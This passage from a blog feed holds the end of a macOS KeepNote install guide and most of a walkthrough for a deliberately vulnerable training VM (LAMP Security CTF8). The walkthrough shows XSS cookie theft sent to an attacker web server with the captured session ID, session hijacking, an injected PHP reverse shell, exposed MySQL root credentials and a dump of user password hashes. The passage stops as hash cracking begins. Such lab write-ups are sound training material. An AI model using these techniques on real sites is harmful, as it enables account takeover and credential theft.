&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /bin/mkdir /usr/local

WARNING: Improper use of the &lt;span class=&quot;nb&quot;&gt;sudo command &lt;/span&gt;could lead to data loss
or the deletion of important system files. Please double-check your
typing when using sudo. Type &lt;span class=&quot;s2&quot;&gt;&quot;man sudo&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

To proceed, enter your password, or &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;Ctrl-C to abort.

Password:
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /bin/chmod g+rwx /usr/local
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /usr/bin/chgrp admin /usr/local
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /bin/mkdir /Library/Caches/Homebrew
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /bin/chmod g+rwx /Library/Caches/Homebrew
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; Installing the Command Line Tools &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;expect a GUI popup&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; /usr/bin/sudo /usr/bin/xcode-select &lt;span class=&quot;nt&quot;&gt;--install&lt;/span&gt;
xcode-select: note: &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;requested &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;line developer tools
Press any key when the installation has completed.
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; Downloading and installing Homebrew...
remote: Counting objects: 191438, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;52107/52107&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Total 191438 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 138158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 191438 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 138158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;191438/191438&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 38.69 MiB | 4.99 MiB/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Resolving deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;138158/138158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
From https://github.com/Homebrew/homebrew
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new branch]      master     -&amp;gt; origin/master
HEAD is now at cc18ca2 rabbitmq-c: general cleanup.
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; Installation successful!
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; Next steps
Run &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;brew doctor&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; before you &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;anything
Run &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;brew &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; to get started&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Run brew doctor to confirm the Brew install is working.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;brew doctor
Your system is ready to brew.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Settle the dependencies for KeepNote using Homebrew:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;brew &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;python aspell sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Use Brew to create Python links:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;brew linkapps&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Download:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://sourceforge.net/projects/macpkg/files/PyGTK/2.24.0/PyGTK.pkg/download&quot;&gt;PyGTK&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://xquartz.macosforge.org/landing/&quot;&gt;Xquartz&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;install-pygtk--xquartz&quot;&gt;Install pyGTK &amp;amp; Xquartz&lt;/h2&gt;

&lt;p&gt;Install pyGTK, double click the download run through the options, you’ll be prompted for your password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/g0cQ4Sh.png&quot; alt=&quot;PyGTK GTK+ Python OSX Install&quot; title=&quot;PyGTK GTK+ Python OSX Install&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then do the same for Xquartz and reboot.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/77iRaHQ.png&quot; alt=&quot;Quartz Install&quot; title=&quot;XQuartz Install&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Pnxz9Q0.png&quot; alt=&quot;XQuartz Mac&quot; title=&quot;XQuartx Mac&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Download and extract the latest KeepNote somewhere sensible, like /usr/local/share/ and cd into the bin dir and execute ./keepnote - KeepNote will then open, my install complained about some missing fonts in the terminal when launching.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ADcoDNl.png&quot; alt=&quot;KeepNote Mac OSX Install&quot; title=&quot;KeepNote Mac OSX Install&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ve chosen not to worry about the missing fonts.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LAMP Security CTF8 - Walkthrough</title>
          <link>https://highon.coffee/blog/lamp-security-ctf8-walkthrough/</link>
          <pubDate>Mon, 05 May 2014 11:00:59 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lamp-security-ctf8-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#inspection-of-the-web-application&quot; id=&quot;markdown-toc-inspection-of-the-web-application&quot;&gt;Inspection of the Web Application&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#xss-session-id-hijacking&quot; id=&quot;markdown-toc-xss-session-id-hijacking&quot;&gt;XSS Session ID Hijacking&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#xss-comment&quot; id=&quot;markdown-toc-xss-comment&quot;&gt;XSS Comment&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-server&quot; id=&quot;markdown-toc-http-server&quot;&gt;HTTP Server&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#email-barbara-victim&quot; id=&quot;markdown-toc-email-barbara-victim&quot;&gt;Email Barbara (victim)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#swapped-session-id-burp-suite&quot; id=&quot;markdown-toc-swapped-session-id-burp-suite&quot;&gt;Swapped Session ID Burp Suite&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#drupal-settingsphp&quot; id=&quot;markdown-toc-drupal-settingsphp&quot;&gt;Drupal settings.php&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#hashcat-md5-cracking&quot; id=&quot;markdown-toc-hashcat-md5-cracking&quot;&gt;Hashcat MD5 cracking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#hydra-ssh-brute-force&quot; id=&quot;markdown-toc-hydra-ssh-brute-force&quot;&gt;Hydra SSH Brute Force&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-account-compromise&quot; id=&quot;markdown-toc-ssh-account-compromise&quot;&gt;SSH Account Compromise&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madirish2600&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.135&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Dislcaimer: Multiple Entry Points&lt;/h5&gt;
  &lt;p&gt;The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the &lt;b&gt;web application&lt;/b&gt; as the entry point.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 21&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;FTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;vsftpd 2.0.5&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
       &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 4.3 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 25&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SMTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Sendmail&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.3 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 110&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;POP3&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot pop3d&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;rpcbind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 139&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;Netbios&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba smbd 3.X (workgroup: WORKGROUP)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 143&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;IMAP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot imapd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 443&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.3 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 445&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;Netbios&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba smbd 3.X (workgroup: WORKGROUP)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 938&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;TCP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 993&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;IMAP SSL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot imapd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 995&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;POP3 SSL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot pop3d&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 3306&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;MySQL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;MySQL (unauthorized)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 5801-5804&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;VNC HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 5901-5904&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;VNC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;VNC (protocol 3.8)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 6001-6004&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;X11&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;X11&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;inspection-of-the-web-application&quot;&gt;Inspection of the Web Application&lt;/h2&gt;

&lt;p&gt;As with the previous CTF series VM’s, I’ve chosen to ignore other entry points
and focus on the &lt;strong&gt;web application&lt;/strong&gt; is used for the entry point.&lt;/p&gt;

&lt;p&gt;Inspection of the web application revealed it was vulnerable to XSS (Cross Site
Scripting):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/xss.png&quot; alt=&quot;XSS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Confirmed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/xss-alert.png&quot; alt=&quot;XSS Alert&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;xss-session-id-hijacking&quot;&gt;XSS Session ID Hijacking&lt;/h2&gt;

&lt;p&gt;From insepecting the web application it appeared &lt;code&gt;Barbara&lt;/code&gt; was an
admin, a guess based on her user activity. A XSS comment was placed on one of
the pages Barbara had created and an email was sent to Barbara instructing her
to view the page.&lt;/p&gt;

&lt;p&gt;The XXS script will execute and attempt to contact a web server on the
attacking machine, the url will disclose &lt;strong&gt;Barbara’s&lt;/strong&gt; session ID.&lt;/p&gt;

&lt;p&gt;Once the ID has been obtained, &lt;strong&gt;Cookie Manager+&lt;/strong&gt; Firefox plugin or &lt;strong&gt;Burp Suite&lt;/strong&gt;
is used to manipulate the stored cookie and replace the session ID with
Barbara’s, hijacking Barbara’s session.&lt;/p&gt;

&lt;h3 id=&quot;xss-comment&quot;&gt;XSS Comment&lt;/h3&gt;

&lt;p&gt;Joomla required a user to preview a comment before saving, in this case the XSS
executes and Joomla fails to save the comment. To evade this behavior,  a
normal comment was posted, then edited to include the XSS snipet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/xss-cookie-hijack.png&quot; alt=&quot;XSS Cookie Hijacking&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;http-server&quot;&gt;HTTP Server&lt;/h3&gt;

&lt;p&gt;A HTTP server was setup on attacking machine: &lt;code&gt;python -m SimpleHTTPServer
80&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;email-barbara-victim&quot;&gt;Email Barbara (victim)&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/email-barbara.png&quot; alt=&quot;XSS Link Email Victim&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a couple of minutes the following appeared in the web server logs:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;192.168.221.135 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05/05/2014 10:54:28] &lt;span class=&quot;s2&quot;&gt;&quot;GET
/?SESS2130d5ef479afc30ab5b3f3d50bbfc5e=9ehlga5fhnh8o81om1aq5so040;%20has_js=1
HTTP/1.1&quot;&lt;/span&gt; 301 -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Barbaras Session ID: &lt;code&gt;9ehlga5fhnh8o81om1aq5so040&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;swapped-session-id-burp-suite&quot;&gt;Swapped Session ID Burp Suite&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/burp-swap-session-id.png&quot; alt=&quot;Burp Swap Session ID&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cookie Manager+&lt;/strong&gt; and / or &lt;strong&gt;Tamper Data&lt;/strong&gt; can also be used for this purpose.&lt;/p&gt;

&lt;p&gt;Successfuly logged in as Barbara:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/login-barbara.png&quot; alt=&quot;Session Hijacked&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;

&lt;p&gt;A reverse shell was injected into a new page using Barbara’s admin account:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/php-reverse-shell.png&quot; alt=&quot;php reverse shell&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;drupal-settingsphp&quot;&gt;Drupal settings.php&lt;/h3&gt;

&lt;p&gt;The following disclosed &lt;code&gt;settings.php&lt;/code&gt; file for &lt;strong&gt;Drupal&lt;/strong&gt; existed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf8/drupal-settings.png&quot; alt=&quot;Drupal Settings.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File path:
&lt;code&gt;/var/www/html/drupal/sites/default/settings.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The file contained the &lt;strong&gt;root&lt;/strong&gt; account credentials for mysql.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;o&quot;&gt;*/&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$db_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysqli://root:JumpUpAndDown@localhost/drupal'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$db_prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following SQL was used to disclose the password hashes:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

sh: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell

sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; drupal
Enter password: JumpUpAndDown
&lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;name,pass from &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
/q
admin     49265c16d1dff8acef3499bd889299d6
Barbara     bed128365216c019988915ed3add75fb
Jim     2a5de0f53b1317f7e36afcdb6b5202a4
Steve     08d15a4aef553492d8971cdd5198f314
Sherry     c3319d1016a802db86653bcfab871f4f
Gene     9b9e4bbd988954028a44710a50982576
Harvey     7d29975b78825ea7c27f5c0281ea2fa4
John     518462cd3292a67c755521c1fb50c909
Johnathan     6dc523ebd2379d96cc0af32e2d224db0
Susan     0d42223010b69cab86634bc359ed870b
Dan     8f75ad3f04fc42f07c95e2f3d0ec3503
George     ed2b1f468c5f915f3f1cf75d7068baae
Jeff     ca594f739e257245f2be69eb546c1c04
Stacey     85aca385eb555fb6a36a62915ddd8bc7
Juan     573152cc51de19df50e90b0e557db7fe
Michael     c7a4476fc64b75ead800da9ea2b7d072
Jerome     42248d4cb640a3fb5836571e254aee2b
Tom     971dcf53e88e9268714d9d504753d347
Xavier     3005d829eb819341357bfddf541c175b
Sally     7a1c07ff60f9c07ffe8da34ecbf4edc2
Latte     42a7ccabfaea30678d6f1b80876773ef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;hashcat-md5-cracking&quot;&gt;Hashcat MD5 cracking&lt;/h2&gt;

&lt;p&gt;Hashcat wased to crack the hashes offline:&lt;/p&gt;

